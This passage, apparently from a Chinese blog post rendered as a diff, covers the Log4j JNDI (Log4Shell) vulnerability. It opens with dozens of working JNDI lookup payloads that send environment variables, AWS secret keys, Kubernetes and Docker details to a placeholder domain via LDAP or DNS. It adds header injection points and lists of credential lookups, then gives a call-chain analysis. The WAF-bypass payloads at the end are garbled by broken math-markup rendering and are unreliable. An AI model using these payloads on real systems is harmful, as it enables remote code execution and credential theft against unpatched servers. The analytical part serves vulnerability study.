+<span class="token variable">$&#123;jndi:dns://$&#123;env:AWS_SECRET_ACCESS_KEY.domain.com/a&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;ctx:loginId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;map:type&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;filename&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;date:MM-dd-yyyy&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;docker:imageName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;env:USER&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;event:Marker&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;mdc:UserId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;java:runtime&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;java:vm&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;java:os&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;jndi:logging/context-name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;hostName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:accountName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:clusterName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:containerName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:host&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:labels.app&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:labels.podTemplateHash&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:masterUrl&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:namespaceId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:namespaceName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podIp&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:imageId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:imageName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;log4j:configLocation&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;log4j:configParentLocation&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;spring:spring.application.name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:myString&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:0&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:1&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:2&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:3&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:4&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;main:bar&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;marker&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;marker:name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;spring:profiles.active[0].domain.com/j&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;sys:logPath&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:ldap://$&#123;web:rootDir&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
+</code></pre> 
+ <p>可检查的标头</p> 
+ <pre><code class="prism language-bash">Accept-Charset
+Accept-Datetime
+Accept-Encoding
+Accept-Language
+Authorization
+Cache-Control
+Cf-Connecting_ip
+Client-Ip
+Contact
+Cookie
+DNT
+Forwarded
+Forwarded-For
+Forwarded-For-Ip
+Forwarded-Proto
+From
+If-Modified-Since
+Max-Forwards
+Origin
+Originating-Ip
+Pragma
+Referer
+TE
+True-Client-IP
+True-Client-Ip
+Upgrade
+User-Agent
+Via
+Warning
+X-ATT-DeviceId
+X-Api-Version
+X-Att-Deviceid
+X-CSRFToken
+X-Client-Ip
+X-Correlation-ID
+X-Csrf-Token
+X-Do-Not-Track
+X-Foo
+X-Foo-Bar
+X-Forward-For
+X-Forward-Proto
+X-Forwarded
+X-Forwarded-By
+X-Forwarded-For
+X-Forwarded-For-Original
+X-Forwarded-Host
+X-Forwarded-Port
+X-Forwarded-Proto
+X-Forwarded-Protocol
+X-Forwarded-Scheme
+X-Forwarded-Server
+X-Forwarded-Ssl
+X-Forwarder-For
+X-Frame-Options
+X-From
+X-Geoip-Country
+X-HTTP-Method-Override
+X-Http-Destinationurl
+X-Http-Host-Override
+X-Http-Method
+X-Http-Method-Override
+X-Http-Path-Override
+X-Https
+X-Htx-Agent
+X-Hub-Signature
+X-If-Unmodified-Since
+X-Imbo-Test-Config
+X-Insight
+X-Ip
+X-Ip-Trail
+X-Leakix
+X-Originating-Ip
+X-ProxyUser-Ip
+X-Real-Ip
+X-Remote-Addr
+X-Remote-Ip
+X-Request-ID
+X-Requested-With
+X-UIDH
+X-Wap-Profile
+X-XSRF-TOKEN
+Authorization: Basic 
+Authorization: Bearer 
+Authorization: Oauth 
+Authorization: Token
+</code></pre> 
+ <p>除ldap以外的其他构造方式</p> 
+ <pre><code class="prism language-bash">jndi:ldap:/
+jndi:rmi:/
+jndi:ldaps:/
+jndi:dns:/
+jndi:nis:/
+jndi:nds:/
+jndi:corba:/
+jndi:iiop:/
+jndi:$<span class="token punctuation">&#123;<!-- --></span>
+</code></pre> 
+ <p>可获取查找的信息</p> 
+ <pre><code class="prism language-bash"><span class="token variable">$&#123;hostName&#125;</span>
+<span class="token variable">$&#123;sys:user.name&#125;</span>
+<span class="token variable">$&#123;sys:user.home&#125;</span>
+<span class="token variable">$&#123;sys:user.dir&#125;</span>
+<span class="token variable">$&#123;sys:java.home&#125;</span>
+<span class="token variable">$&#123;sys:java.vendor&#125;</span>
+<span class="token variable">$&#123;sys:java.version&#125;</span>
+<span class="token variable">$&#123;sys:java.vendor.url&#125;</span>
+<span class="token variable">$&#123;sys:java.vm.version&#125;</span>
+<span class="token variable">$&#123;sys:java.vm.vendor&#125;</span>
+<span class="token variable">$&#123;sys:java.vm.name&#125;</span>
+<span class="token variable">$&#123;sys:os.name&#125;</span>
+<span class="token variable">$&#123;sys:os.arch&#125;</span>
+<span class="token variable">$&#123;sys:os.version&#125;</span>
+<span class="token variable">$&#123;env:JAVA_VERSION&#125;</span>
+<span class="token variable">$&#123;env:AWS_SECRET_ACCESS_KEY&#125;</span>
+<span class="token variable">$&#123;env:AWS_SESSION_TOKEN&#125;</span>
+<span class="token variable">$&#123;env:AWS_SHARED_CREDENTIALS_FILE&#125;</span>
+<span class="token variable">$&#123;env:AWS_WEB_IDENTITY_TOKEN_FILE&#125;</span>
+<span class="token variable">$&#123;env:AWS_PROFILE&#125;</span>
+<span class="token variable">$&#123;env:AWS_CONFIG_FILE&#125;</span>
+<span class="token variable">$&#123;env:AWS_ACCESS_KEY_ID&#125;</span>
+</code></pre> 
+ <p>一张脑图（有一说一不是很懂这个）<br> <img src="https://img-blog.csdnimg.cn/f44b105478ca4b4ebacd60249c65cf9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <h2><a id="_329"></a><mark>批量验证工具</mark></h2> 
+ <p><a target="_blank" rel="noopener" href="https://github.com/inbug-team/Log4j_RCE_Tool">log4j批量检测工具</a><br> 这个是主动检测的<br> 但是自己测了下,发觉测不出东西<br> 但是主动检测的太少了 还是把这个工具扔在这里<br> <img src="https://img-blog.csdnimg.cn/8e9287f280ce40e89c435dfb54e36a3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <h1><a id="_335"></a>原理研究</h1> 
+ <h2><a id="_336"></a>基础知识点</h2> 
+ <p>JNDI<br> 全名：Java命名和目录接口，自己理解就是定义一个名称去绑定对象或者资源进而进行操控<br> 作用：将名称与java对象或资源关联起来，进行通过名称调用到对应的对象或者资源<br> 可操控的目录与服务有： DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、WindowsXP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p> 
+ <p>运用方法：<br> 如JNDI数据源配置（使用的原因 只配置一次①加载数据库驱动程序、②连接数据库、④关闭数据库，释放连接，减少性能消耗）<br> 这个师傅讲的比较好了 这里就不讲了</p> 
+ <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdp-gacl/p/3951952.html">参考链接</a></p> 
+ <p><img src="https://img-blog.csdnimg.cn/6fc8cdd5e2034b02ac1cc2ce1791f925.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>LDAP(轻量目录访问协议)<br> LDAP目录服务：由目录数据库和一套访问协议组成的系统。<br> 作用：即存储描述属性的数据和详细信息的数据库。<br> 四种模型：</p> 
+ <pre><code class="prism language-bash">信息模型
+命名模型
+功能模型
+安全模型
+</code></pre> 
+ <p>连接LDAP数据库方法：</p> 
+ <pre><code class="prism language-bash"><span class="token variable">$ldapconn</span> <span class="token operator">=</span> ldap_connect<span class="token punctuation">(</span>“10.1.8.78<span class="token string">")
+<span class="token variable">$ldapbind</span> = ldap_bind(<span class="token variable">$ldapconn</span>, 'username', <span class="token variable">$ldappass</span>);
+<span class="token variable">$searchRows</span>= ldap_search(<span class="token variable">$ldapconn</span>, <span class="token variable">$basedn</span>, "</span><span class="token punctuation">(</span>cn<span class="token operator">=</span>*<span class="token punctuation">)</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$searchResult</span> <span class="token operator">=</span> ldap_get_entries<span class="token punctuation">(</span><span class="token variable">$ldapconn</span>, <span class="token variable">$searchRows</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ldap_close<span class="token punctuation">(</span><span class="token variable">$ldapconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+ <p>lookup：允许在写日志的时候，通过关键词去查找对象，输出对象，并实现对象功能。这个对象可以存储在硬盘中或者服务器上。</p> 
+ <p>这个漏洞调用的就是这个接口</p> 
+ <p>Codebase<br> 概念：一种服务<br> 作用：存储代码或者编译文件作用，可通过名称进行编译文件或者获取代码。</p> 
+ <p>RMI协议：<br> 概念：远程方法调用协议，通过网络从远程计算机上请求调用某种服务。(只适合java)</p> 
+ <p>原理：</p> 
+ <pre><code class="prism language-bash">1.客户调用客户端辅助对象stub上的方法
+2.客户端辅助对象stub打包调用信息（变量，方法名），通过网络发送给服务端辅助对象skeleton
+3.服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象
+4.调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton
+5.服务端辅助对象将结果打包，发送给客户端辅助对象stub
+6.客户端辅助对象将返回值解包，返回给调用者
+7.客户获得返回值
+</code></pre> 
+ <p><img src="https://img-blog.csdnimg.cn/3fa499394fd24ae781a710675c8acd81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <h2><a id="_398"></a>漏洞原理知识点：</h2> 
+ <p>加载原理：通过rmi进行从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类，进而造成RCE漏洞<br> <img src="https://img-blog.csdnimg.cn/69df0ca22e0b4552813cbd614b9b1583.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/f1dd7030daf84ef7a761550d2ce3145a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 详细跟进分析<br> 完整的调用链</p> 
+ <pre><code class="prism language-bash">lookup:172, JndiManager <span class="token punctuation">(</span>org.apache.logging.log4j.core.net<span class="token punctuation">)</span>
+lookup:56, JndiLookup <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
+lookup:223, Interpolator <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
+resolveVariable:1116, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
+substitute:1038, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
+substitute:912, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
+replace:467, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
+format:132, MessagePatternConverter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
+format:38, PatternFormatter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
+toSerializable:345, PatternLayout<span class="token variable">$PatternSerializer</span> <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
+toText:244, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
+encode:229, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
+encode:59, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
+directEncodeEvent:197, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
+tryAppend:190, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
+append:181, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
+tryCallAppender:156, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+callAppender0:129, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+callAppenderPreventRecursion:120, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+callAppender:84, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+callAppenders:543, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+processLogEvent:502, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+log:485, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+log:460, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+log:63, DefaultReliabilityStrategy <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
+log:161, Logger <span class="token punctuation">(</span>org.apache.logging.log4j.core<span class="token punctuation">)</span>
+tryLogMessage:2198, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
+logMessageTrackRecursion:2152, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
+logMessageSafely:2135, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
+logMessage:2011, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
+logIfEnabled:1983, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
+error:740, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
+main:8, log4jRCE
+</code></pre> 
+ <p>这里要重点关注的几个点,其余的点几乎都是调用方法或者是进行过滤操作获取数字等</p> 
+ <p>①这里进行判断了日志等级 如果是小于配置文件的即不能进入 this.logMessage()进行触发漏洞<br> 日志等级 默认只要大于error()和fatal()可以触发漏洞就可以触发漏洞了 具体看配置情况</p> 
+ <pre><code class="prism language-bash">日志一共分为8个级别，由低到高依次为：All <span class="token operator">&lt;</span> Trace <span class="token operator">&lt;</span> Debug <span class="token operator">&lt;</span> Info <span class="token operator">&lt;</span> Warn <span class="token operator">&lt;</span> Error <span class="token operator">&lt;</span> Fatal <span class="token operator">&lt;</span> OFF。
+1.All：最低等级的，用于打开所有日志记录。
+2.Trace：是追踪，就是程序推进以下，你就可以写个trace输出，所以trace应该会特别多，不过没关系，我们可以设置最低日志级别不让他输出。
+3.Debug：指出细粒度信息事件对调试应用程序是非常有帮助的。
+4.Info：消息在粗粒度级别上突出强调应用程序的运行过程。
+5.Warn：输出警告及warn以下级别的日志。
+6.Error：输出错误信息日志。
+7.Fatal：输出每个严重的错误事件将会导致应用程序的退出的日志。
+8.OFF：最高等级的，用于关闭所有日志记录。
+</code></pre> 
+ <p><img src="https://img-blog.csdnimg.cn/73e3102efdd84a04a0fc2e7369f1b0a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>配置的最低等级的文件数值在org/apache/logging/log4j/spi/StandardLevel.java中</p> 
+ <p>②log:460, LoggerConfig (org.apache.logging.log4j.core.config)这个地方<br> 上面的东西查了下感觉就是线程相关所以可以不看 核心还是log的方法<br> <img src="https://img-blog.csdnimg.cn/5799870557bc4082a264da1d296ca530.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>③MessagePatternConverter方法<br> <img src="https://img-blog.csdnimg.cn/139cf5be2ec844e09f17ae280e7e4b10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④跟replace方法<br> 调用substitute方法<br> <img src="https://img-blog.csdnimg.cn/ec08848f5f074a31aa61e45471e4dd5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 先调用一个substitute的方法<br> <img src="https://img-blog.csdnimg.cn/9bc5bd97ada242ffa66b06fa365b8414.png" alt=""><br> 然后调用另外一个substitute的重载函数进行处理数据<br> ⑤研究substitute方法<br> 初始化定义的一些变量名<br> <img src="https://img-blog.csdnimg.cn/e1e99abe2a6f4999b9ccfd3673400d34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>采用while循环逐个去寻找前缀这里的前缀定义即是$和{字符<br> 进行前缀匹配<br> <img src="https://img-blog.csdnimg.cn/8c89829dcec34b189cb9a5d10749bd54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>寻找后缀唯一区别就是可以理解为一个从前查找一个从后查找<br> <img src="https://img-blog.csdnimg.cn/f01fb3723b9a4cb9bc3a6cea5543794a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>然后进行匹配 :- 和 :<br> 对于这种字符的处理 看一个师傅的说法是<br> :-<br> 赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb<br> :-<br> 是转义的 :-，如果一个用 a:b 表示的键值对的 key a 中包含 :，则需要使用转义来配合处理，例如 ${aaa:\-bbb:-ccc}，代表 key 是，aaa:bbb，value 是 ccc。<br> <mark>这也是绕waf的的一些原因</mark></p> 
+ <pre><code class="prism language-bash">因此结合这些递归解析以及特性我们可以进行绕waf
+构造出一些类似于如此的一些payload去绕
+<p><span class="token variable">&#123;&#123;::-j&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>n</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-n&#125;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">n</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-d&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>i</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>k</mi><mi>e</mi><mi>y</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo><mo>:</mo><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-i&#125;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">i</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span 